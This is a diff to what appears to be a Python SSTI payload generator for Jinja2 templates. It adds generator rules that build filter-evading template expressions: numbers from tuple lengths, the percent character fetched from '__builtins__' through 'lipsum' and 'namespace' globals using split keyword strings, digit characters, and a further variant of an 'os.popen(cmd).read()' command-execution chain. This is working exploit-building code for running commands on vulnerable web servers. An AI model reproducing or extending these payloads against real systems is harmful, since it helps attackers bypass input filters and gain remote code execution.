@@ -314,6 +314,19 @@ def gen_positive_integer_sum(context: dict, value: int):
     ]
 
 
+@req_gen
+def gen_positive_integer_length(context: dict, value: int):
+    return [
+        (LITERAL, "(({},)|length)".format(",".join("x" * value)))
+    ]
+
+@req_gen
+def gen_positive_integer_length2(context: dict, value: int):
+    return [
+        (LITERAL, "(({},).__len__( ))".format(",".join("x" * value)))
+    ]
+
+
 # ---
 
 
@@ -452,6 +465,29 @@ def gen_string_percent_lipsum(context):
             + "|join+(lipsum|escape|batch(22)|list|first|last)*2][dict(chr=x)|join](37))",
         )
     ]
+
+@req_gen
+def gen_string_percent_lipsum2(context):
+    return [
+        (
+            LITERAL,
+            "(lipsum['__glob''als__']['__builti''ns__']['chr'](37))"
+        )
+    ]
+
+@req_gen
+def gen_string_percent_namespace(context):
+    return [
+        (
+            LITERAL,
+            "(namespace['__ini''t__']['__glob''al''s__']['__builti''ns__']['chr']("
+        ),
+        (INTEGER, 37),
+        (
+            LITERAL, "))"
+        )
+    ]
+
 
 
 @req_gen
@@ -799,6 +835,11 @@ def gen_char_dict(context, c):
         return [(UNSATISFIED,)]
     return [(LITERAL, f"(dict({c}=x)|join)")]
 
+@req_gen
+def gen_char_num(context, c):
+    if not re.match("[0-9]", c):
+        return [(UNSATISFIED,)]
+    return [(LITERAL, f"((", ), (INTEGER, int(c)), (LITERAL, ").__str__( ))")]
 
 # ---
 # 以下的gen_string会互相依赖，但是产生互相依赖时传入的字符串长度会减少所以不会发生无限调用
@@ -1342,6 +1383,17 @@ def gen_os_popen_read_normal(context, cmd):
         (LITERAL, "("),
         (ATTRIBUTE, (OS_POPEN_OBJ, cmd), "read"),
         (LITERAL, "())"),
+    ]
+
+@req_gen
+def gen_os_popen_read_normal2(context, cmd):
+    return [
+        (LITERAL, "("),
+        (ATTRIBUTE, (OS_POPEN_OBJ, cmd), "read"),
+        (LITERAL, "("),
+        (INTEGER, -1),
+        (LITERAL, "))"),
+
     ]
 
 @req_gen
